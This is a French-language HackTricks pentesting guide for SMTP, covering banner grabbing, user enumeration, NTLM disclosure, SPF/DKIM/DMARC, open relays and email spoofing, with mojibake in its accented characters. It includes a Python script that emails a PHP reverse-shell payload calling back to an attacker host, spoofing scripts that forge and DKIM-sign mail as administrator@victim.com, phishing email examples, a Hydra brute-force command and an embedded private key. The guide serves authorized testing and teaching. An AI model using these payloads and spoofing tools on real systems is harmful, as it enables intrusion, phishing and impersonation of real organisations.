# 25,465,587 - Test d'intrusion SMTP/s

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Configuration imm√©diatement disponible pour l'√©valuation de la vuln√©rabilit√© et le test d'intrusion**. Lancez un test d'intrusion complet de n'importe o√π avec plus de 20 outils et fonctionnalit√©s allant de la reconnaissance au rapport. Nous ne rempla√ßons pas les testeurs d'intrusion - nous d√©veloppons des outils personnalis√©s, des modules de d√©tection et d'exploitation pour leur redonner du temps pour approfondir, obtenir des acc√®s et s'amuser.

{% embed url="https://pentest-tools.com/" %}

## **Informations de base**

**SMTP (Simple Mail Transfer Protocol)** est un protocole TCP/IP utilis√© pour **envoyer** et recevoir des **e-mails**. Cependant, comme il est limit√© dans sa capacit√© √† mettre en file d'attente les messages √† l'extr√©mit√© de r√©ception, il est g√©n√©ralement utilis√© avec l'un des deux autres protocoles, POP3 ou IMAP, qui permettent √† l'utilisateur de sauvegarder les messages dans une bo√Æte aux lettres du serveur et de les t√©l√©charger p√©riodiquement depuis le serveur.

En d'autres termes, **les utilisateurs utilisent g√©n√©ralement** un programme qui utilise **SMTP pour envoyer des e-mails** et soit **POP3 soit IMAP pour recevoir** des e-mails. Sur les syst√®mes bas√©s sur Unix, **sendmail** est le serveur SMTP le plus utilis√© pour les e-mails. Un package commercial, Sendmail, comprend un serveur POP3. **Microsoft Exchange** comprend un serveur SMTP et peut √©galement √™tre configur√© pour inclure la prise en charge POP3.\
Depuis [ici](https://whatis.techtarget.com/definition/SMTP-Simple-Mail-Transfer-Protocol).

**Port par d√©faut :** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
### En-t√™tes EMAIL

Si vous avez l'opportunit√© de **faire envoyer un email par la victime** (via le formulaire de contact de la page web par exemple), faites-le car **vous pourriez en apprendre davantage sur la topologie interne** de la victime en observant les en-t√™tes du mail.

Vous pouvez √©galement obtenir un email d'un serveur SMTP en essayant **d'envoyer √† ce serveur un email √† une adresse inexistante** (car le serveur enverra √† l'attaquant un mail NDN). Mais, assurez-vous que vous envoyez l'email depuis une adresse autoris√©e (v√©rifiez la politique SPF) et que vous pouvez recevoir des messages NDN.

Vous devriez aussi essayer **d'envoyer diff√©rents contenus car vous pourriez trouver des informations plus int√©ressantes** dans les en-t√™tes comme : `X-Virus-Scanned: by av.domain.com`\
Vous devriez envoyer le fichier de test EICAR.\
D√©tecter l'**AV** peut vous permettre d'exploiter **des vuln√©rabilit√©s connues.**

## Actions de base

### **R√©cup√©ration de banni√®re/Connexion de base**

**SMTP :**
```bash
nc -vn <IP> 25
```
**SMTPS** :
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### Trouver les serveurs MX d'une organisation
```bash
dig +short mx google.com
```
### √ânum√©ration
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### Authentification NTLM - Divulgation d'informations

Si le serveur prend en charge l'authentification NTLM (Windows), vous pouvez obtenir des informations sensibles (versions). Plus d'informations [**ici**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666).
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
```markdown
Ou **automatisez** cela avec le plugin **nmap** `smtp-ntlm-info.nse`

### Nom du serveur interne - Divulgation d'informations

Certains serveurs SMTP compl√®tent automatiquement l'adresse de l'exp√©diteur lorsque la commande "MAIL FROM" est √©mise sans une adresse compl√®te, r√©v√©lant ainsi son nom interne :
```
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### Sniffing

V√©rifiez si vous pouvez intercepter des mots de passe √† partir des paquets vers le port 25

### [Auth bruteforce](../../generic-methodologies-and-resources/brute-force.md#smtp)

## √ânum√©ration de Bruteforce de Noms d'utilisateur

**L'authentification n'est pas toujours n√©cessaire**

### RCPT TO
```bash
$ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
MAIL FROM:test@test.org
250 2.1.0 test@test.org... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY
```
$ telnet 10.0.0.1 25
Trying 10.0.0.1...
Connected to 10.0.0.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
VRFY root
250 Super-User <root@myhost>
VRFY blah
550 blah... User unknown
```
### EXPN
```
$ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 <ed.williams@myhost>
EXPN sshd
250 2.1.5 sshd privsep <sshd@mail2>
```
Extrait de : [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)

### Outils automatiques
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
<figure><img src="../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**La DragonJAR Security Conference est un √©v√©nement international de cybers√©curit√©**](https://www.dragonjarcon.org/) qui existe depuis plus d'une d√©cennie et se tiendra les 7 et 8 septembre 2023 √† Bogot√°, en Colombie. C'est un √©v√©nement au contenu technique √©lev√© o√π sont pr√©sent√©es les derni√®res recherches en espagnol, attirant des hackers et des chercheurs du monde entier.\
Inscrivez-vous maintenant en suivant le lien ci-dessous et ne manquez pas cette importante conf√©rence ! :

{% embed url="https://www.dragonjarcon.org/" %}

## Rapports DSN

**Rapports de Notification d'√âtat de Distribution** : Si vous envoyez un **email** √† une organisation √† une **adresse invalide**, l'organisation vous notifiera que l'adresse √©tait invalid√©e en envoyant un **email en retour**. Les **en-t√™tes** de l'email retourn√© **contiendront** des **informations sensibles** possibles (comme l'adresse IP des services de messagerie qui ont interagi avec les rapports ou des informations sur le logiciel anti-virus).

## [Commandes](smtp-commands.md)

### Envoyer un Email depuis la console Linux
```
root@kali:~# sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

IT Dept,

We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.

Sincerely,
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
### Envoyer un Email avec Python

Voici une autre m√©thode pour envoyer un email avec un script python
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
## Usurpation d'Email

La majeure partie de cette section a √©t√© extraite du livre **Network Security Assessment 3rd Edition**.

Les messages SMTP sont facilement usurp√©s, c'est pourquoi les organisations utilisent les fonctionnalit√©s **SPF**, **DKIM** et **DMARC** pour emp√™cher l'envoi d'emails non autoris√©s.

Un **guide complet de ces contre-mesures** est disponible sur [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/)

### SPF

{% hint style="danger" %}
SPF [a √©t√© "d√©pr√©ci√©" en 2014](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/). Cela signifie qu'au lieu de cr√©er un **enregistrement TXT** dans `_spf.domain.com`, vous le cr√©ez dans `domain.com` en utilisant la **m√™me syntaxe**.\
De plus, pour r√©utiliser des enregistrements spf pr√©c√©dents, il est assez courant de trouver quelque chose comme `"v=spf1 include:_spf.google.com ~all"`
{% endhint %}

Le **Sender Policy Framework** (SPF) fournit un m√©canisme qui permet aux MTAs de v√©rifier si un h√¥te envoyant un email est autoris√©.\
Les organisations peuvent alors d√©finir une liste de serveurs de messagerie autoris√©s et les MTAs peuvent interroger ces listes pour v√©rifier si l'email a √©t√© usurp√© ou non.\
Afin de d√©finir les adresses IP/plages, domaines et autres qui sont **autoris√©s √† envoyer des emails au nom d'un nom de domaine**, diff√©rents "**M√©canismes**" peuvent appara√Ætre dans le registre SPF.

#### M√©canismes

| M√©canisme | Description                                                                                                                                                                                                                                                                                                                         |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | Correspond toujours ; utilis√© pour un r√©sultat par d√©faut comme `-all` pour toutes les IPs non appari√©es par les m√©canismes pr√©c√©dents.                                                                                                                                                                                              |
| A         | Si le nom de domaine a un enregistrement d'adresse (A ou AAAA) qui peut √™tre r√©solu √† l'adresse de l'exp√©diteur, il correspondra.                                                                                                                                                                                                   |
| IP4       | Si l'exp√©diteur se trouve dans une plage d'adresses IPv4 donn√©e, correspond.                                                                                                                                                                                                                                                        |
| IP6       | Si l'exp√©diteur se trouve dans une plage d'adresses IPv6 donn√©e, correspond.                                                                                                                                                                                                                                                        |
| MX        | Si le nom de domaine a un enregistrement MX qui se r√©sout √† l'adresse de l'exp√©diteur, il correspondra (c'est-√†-dire que le courrier provient de l'un des serveurs de messagerie entrants du domaine).                                                                                                                              |
| PTR       | Si le nom de domaine (enregistrement PTR) pour l'adresse du client est dans le domaine donn√© et que ce nom de domaine se r√©sout √† l'adresse du client (DNS invers√© confirm√©), correspond. Ce m√©canisme est d√©conseill√© et doit √™tre √©vit√©, si possible.                                                                             |
| EXISTS    | Si le nom de domaine donn√© se r√©sout √† n'importe quelle adresse, correspond (peu importe l'adresse √† laquelle il se r√©sout). C'est rarement utilis√©. Avec le langage de macro SPF, il offre des correspondances plus complexes comme les requ√™tes DNSBL.                                                                            |
| INCLUDE   | R√©f√©rence la politique d'un autre domaine. Si la politique de ce domaine passe, ce m√©canisme passe. Cependant, si la politique incluse √©choue, le traitement continue. Pour d√©l√©guer enti√®rement √† la politique d'un autre domaine, l'extension de redirection doit √™tre utilis√©e.                                                  |
| REDIRECT  | <p>Une redirection est un pointeur vers un autre nom de domaine qui h√©berge une politique SPF, cela permet √† plusieurs domaines de partager la m√™me politique SPF. C'est utile lorsqu'on travaille avec un grand nombre de domaines qui partagent la m√™me infrastructure de messagerie.</p><p>La politique SPF du domaine indiqu√© dans le m√©canisme de redirection sera utilis√©e.</p> |

Il est √©galement possible d'identifier des **Qualificateurs** qui indiquent **ce qui doit √™tre fait si un m√©canisme correspond**. Par d√©faut, le **qualificateur "+"** est utilis√© (donc si un m√©canisme correspond, cela signifie qu'il est autoris√©).\
Vous remarquerez g√©n√©ralement **√† la fin de chaque politique SPF** quelque chose comme : **\~all** ou **-all**. Cela est utilis√© pour indiquer que **si l'exp√©diteur ne correspond √† aucune politique SPF, vous devriez marquer l'email comme non fiable (\~) ou rejeter (-) l'email.**

#### Qualificateurs

Chaque m√©canisme peut √™tre combin√© avec l'un des quatre qualificateurs :

* **`+`** pour un r√©sultat PASS. Cela peut √™tre omis ; par exemple, `+mx` est la m√™me chose que `mx`.
* **`?`** pour un r√©sultat NEUTRAL interpr√©t√© comme NONE (aucune politique).
* **`~`** (tilde) pour SOFTFAIL, un outil de d√©bogage entre NEUTRAL et FAIL. Typiquement, les messages qui retournent un SOFTFAIL sont accept√©s mais marqu√©s.
* **`-`** (moins) pour FAIL, le courrier doit √™tre rejet√© (voir ci-dessous).

Dans l'exemple suivant, vous pouvez lire la **politique SPF de google.com**. Notez comment la **premi√®re politique SPF inclut les politiques SPF d'autres domaines :**
```shell-session
kali@kali:~$ dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

kali@kali:~$ dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

kali@kali:~$ dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

kali@kali:~$ dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

kali@kali:~$ dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
Traditionnellement, il √©tait possible de falsifier n'importe quel nom de domaine qui n'avait pas d'enregistrement SPF correct ou en l'absence de celui-ci. **De nos jours**, si un **courriel** provient d'un **domaine sans enregistrement SPF valide**, il sera probablement **rejet√©/marqu√© comme non fiable automatiquement**.

Pour v√©rifier l'SPF d'un domaine, vous pouvez utiliser des outils en ligne comme : [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM

DomainKeys Identified Mail (DKIM) est un m√©canisme par lequel **les courriels sortants sont sign√©s et valid√©s par des MTAs √©trangers apr√®s avoir r√©cup√©r√© la cl√© publique d'un domaine via DNS**. La cl√© publique DKIM est contenue dans un enregistrement TXT pour un domaine ; cependant, vous devez conna√Ætre √† la fois le s√©lecteur et le nom de domaine pour la r√©cup√©rer.

Ensuite, pour demander la cl√©, vous avez besoin du nom de domaine et du s√©lecteur du courriel √† partir de l'en-t√™te du courriel `DKIM-Signature` par exemple : `d=gmail.com;s=20120113`
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCg
KCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC

Domain-based Message Authentication, Reporting & Conformance (DMARC) est une m√©thode d'authentification de courrier qui s'appuie sur SPF et DKIM. Les politiques indiquent aux serveurs de messagerie comment traiter les e-mails pour un domaine donn√© et rapportent les actions effectu√©es.

![](<../../.gitbook/assets/image (134).png>)

**Pour obtenir l'enregistrement DMARC, vous devez interroger le sous-domaine \_dmarc**
```shell-session
root@kali:~# dig _dmarc.yahoo.com txt | grep DMARC
_dmarc.yahoo.com.  1785 IN TXT "v=DMARC1\; p=reject\; sp=none\; pct=100\;
rua=mailto:dmarc-yahoo-rua@yahoo-inc.com, mailto:dmarc_y_rua@yahoo.com\;"

root@kali:~# dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com. 600 IN TXT "v=DMARC1\; p=quarantine\; rua=mailto:mailauth-reports@google.com"

root@kali:~# dig _dmarc.paypal.com txt | grep DMARC
_dmarc.paypal.com. 300 IN TXT "v=DMARC1\; p=reject\; rua=mailto:d@rua.agari.com\;
ruf=mailto:dk@bounce.paypal.com,mailto:d@ruf.agari.com"
```
#### Balises DMARC

| Nom de la balise | But                                           | Exemple                         |
| ---------------- | --------------------------------------------- | ------------------------------- |
| v                | Version du protocole                          | v=DMARC1                        |
| pct              | Pourcentage de messages soumis au filtrage    | pct=20                          |
| ruf              | URI de rapport pour les rapports forensiques  | ruf=mailto:authfail@example.com |
| rua              | URI de rapport des rapports agr√©g√©s           | rua=mailto:aggrep@example.com   |
| p                | Politique pour le domaine organisationnel     | p=quarantine                    |
| sp               | Politique pour les sous-domaines du DO        | sp=reject                       |
| adkim            | Mode d'alignement pour DKIM                   | adkim=s                         |
| aspf             | Mode d'alignement pour SPF                    | aspf=r                          |

### **Et les sous-domaines ?**

**Depuis** [**ici**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
Vous devez avoir des enregistrements SPF s√©par√©s pour chaque sous-domaine d'o√π vous souhaitez envoyer des mails.\
Ce qui suit a √©t√© initialement post√© sur openspf.org, qui √©tait une excellente ressource pour ce genre de choses.

> La Question D√©moniaque : Et les sous-domaines ?
>
> Si je re√ßois un mail de pielovers.demon.co.uk, et qu'il n'y a pas de donn√©es SPF pour pielovers, dois-je remonter d'un niveau et tester le SPF pour demon.co.uk ? Non. Chaque sous-domaine chez Demon est un client diff√©rent, et chaque client peut avoir sa propre politique. Il ne serait pas logique que la politique de Demon s'applique √† tous ses clients par d√©faut ; si Demon souhaite le faire, il peut configurer des enregistrements SPF pour chaque sous-domaine.
>
> Donc le conseil aux √©diteurs de SPF est le suivant : vous devriez ajouter un enregistrement SPF pour chaque sous-domaine ou nom d'h√¥te qui a un enregistrement A ou MX.
>
> Les sites avec des enregistrements A ou MX g√©n√©riques devraient √©galement avoir un enregistrement SPF g√©n√©rique, sous la forme : \* IN TXT "v=spf1 -all"

Cela a du sens - un sous-domaine peut tr√®s bien se trouver dans un emplacement g√©ographique diff√©rent et avoir une d√©finition SPF tr√®s diff√©rente.

### **Relais Ouvert**

Pour √©viter que les emails envoy√©s soient filtr√©s par les filtres anti-spam et n'atteignent pas le destinataire, l'exp√©diteur peut utiliser un **serveur relais de confiance pour le destinataire**. Souvent, les administrateurs **n'ont pas de vue d'ensemble** sur les plages d'**IP** qu'ils doivent **autoriser**. Cela r√©sulte en une mauvaise configuration du serveur SMTP que nous trouverons encore souvent dans les tests de p√©n√©tration externes et internes. Par cons√©quent, ils **autorisent toutes les adresses IP** pour ne pas causer d'erreurs dans le trafic des emails et ainsi ne pas perturber ou interrompre involontairement la communication avec les clients potentiels et actuels :
```shell-session
mynetworks = 0.0.0.0/0
```

```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **Outils**

* [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **V√©rifier les mauvaises configurations de SPF et DMARC**
* [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **Obtenir automatiquement les configurations de SPF et DMARC**

### Envoyer un Email Falsifi√©

* [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
* [**http://www.anonymailer.net/**](http://www.anonymailer.net)
* [**https://emkei.cz/**](https://emkei.cz/)\*\*\*\*

**Ou vous pourriez utiliser un outil :**

* [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)\*\*\*\*
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
{% hint style="warning" %}
Si vous rencontrez une **erreur lors de l'utilisation de la librairie python dkim** pour analyser la cl√©, n'h√©sitez pas √† utiliser la suivante.\
**REMARQUE** : Il s'agit simplement d'un correctif rapide pour effectuer des v√©rifications rapides dans les cas o√π, pour une raison quelconque, la cl√© priv√©e openssl **ne peut pas √™tre analys√©e par dkim**.
```
-----BEGIN RSA PRIVATE KEY-----
MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
-----END RSA PRIVATE KEY-----
```
{% endhint %}

**Ou vous pourriez le faire manuellement :**

{% tabs %}
{% tab title="PHP" %}
<pre class="language-php"><code class="lang-php"><strong># Cela enverra un message non sign√©
</strong><strong>mail("your_email@gmail.com", "Sujet de test!", "hey! Ceci est un test", "De: administrator@victim.com");
</strong></code></pre>
{% endtab %}

{% tab title="Python" %}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{% endtab %}
{% endtabs %}

### **Plus d'infos**

**Trouvez plus d'informations sur ces protections sur** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/)

### **Autres indicateurs de phishing**

* √Çge du domaine
* Liens pointant vers des adresses IP
* Techniques de manipulation de liens
* Pi√®ces jointes suspectes (peu communes)
* Contenu d'email endommag√©
* Valeurs utilis√©es diff√©rentes de celles des en-t√™tes de mail
* Existence d'un certificat SSL valide et de confiance
* Soumission de la page √† des sites de filtrage de contenu web

## Exfiltration via SMTP

**Si vous pouvez envoyer des donn√©es via SMTP** [**lisez ceci**](../../generic-methodologies-and-resources/exfiltration.md#smtp)**.**

## Fichier de configuration

### Postfix

Habituellement, s'il est install√©, dans `/etc/postfix/master.cf` contient **des scripts √† ex√©cuter** quand par exemple un nouveau mail est re√ßu par un utilisateur. Par exemple, la ligne `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` signifie que `/etc/postfix/filtering` sera ex√©cut√© si un nouveau mail est re√ßu par l'utilisateur mark.

Autres fichiers de configuration :
```
sendmail.cf
submit.cf
```
## Commandes Automatiques HackTricks
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
```markdown
<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

